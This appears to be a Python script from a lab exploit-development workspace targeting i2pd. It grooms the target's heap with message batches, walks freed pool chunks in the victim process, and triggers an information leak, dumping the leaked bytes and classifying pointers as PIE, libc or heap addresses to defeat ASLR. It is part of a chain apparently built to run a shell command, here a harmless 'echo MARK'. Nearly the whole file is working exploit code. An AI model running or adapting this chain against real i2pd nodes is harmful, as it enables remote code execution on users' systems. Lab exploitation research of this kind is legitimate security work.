
import sys, struct, time, json
sys.path.insert(0, "/home/agentuser/i2pd-lab/vuln01")
import atk_p6_terminal as A
from atk_p6_terminal import Chain, scan_pool_chunks, read_qwords, log
A.LIBC_EXIT = A.get_libc_exit()
import os
os.makedirs(A.EV, exist_ok=True)
ch = Chain("echo MARK > /tmp/m1", 99)
ch.setup()
tag = ch.sc.relay_tag
want1 = list(range(0x1000, 0x100a)); ch.fire_batch(10, 0x1000, tag)
nm1 = ch.drain(ch.sc, want_nonces=want1, timeout=2.0); ch.ack_exact(ch.sc, nm1.values()); time.sleep(0.2)
want2 = list(range(0x2000, 0x2008)); ch.fire_batch(8, 0x2000, tag)
nm2 = ch.drain(ch.sc, want_nonces=want2, timeout=2.0); ch.ack_exact(ch.sc, nm2.values()); time.sleep(0.25)
freed = scan_pool_chunks(ch.bob_pid, ch.idpref)
cand = [a for a in freed if freed[a][:2] != "02"]
nxt = read_qwords(ch.bob_pid, cand)
inset = set(cand); edges = {a: v for a, v in nxt.items() if v in inset}
pointed = set(edges.values()); heads = [a for a in cand if a not in pointed]
def chain_len(h):
    n, cur = 1, h
    while cur in edges: cur = edges[cur]; n += 1
    return n
head = max(heads, key=chain_len)
chain = []; cur = head
while cur in edges: chain.append(cur); cur = edges[cur]
chain.append(cur)
log("chain", "len %d" % len(chain))
next_of = {chain[i]: chain[i+1] for i in range(len(chain)-1)}
tail_next = nxt.get(chain[-1], 0)
leak = ch.do_leak(tag, next_of.get(chain[1], tail_next))
open("/tmp/leak99.bin","wb").write(leak)
print("LEAK", len(leak))
kinds = {}
for off in range(0, len(leak)-8, 8):
    v = struct.unpack("<Q", leak[off:off+8])[0]
    k = "zero" if v==0 else ("pie" if 0x550000000000<=v<0x570000000000 else ("lib7f" if 0x7f0000000000<=v<0x800000000000 else ("heap" if 0x1000<v<0x700000000000 else "other")))
    kinds[k] = kinds.get(k,0)+1
print("KINDS", kinds)
n=0
for off in range(0, len(leak)-8, 8):
    v = struct.unpack("<Q", leak[off:off+8])[0]
    if v and 0x1000 < v < 0x800000000000:
        print(hex(off), hex(v)); n+=1
        if n>30: break
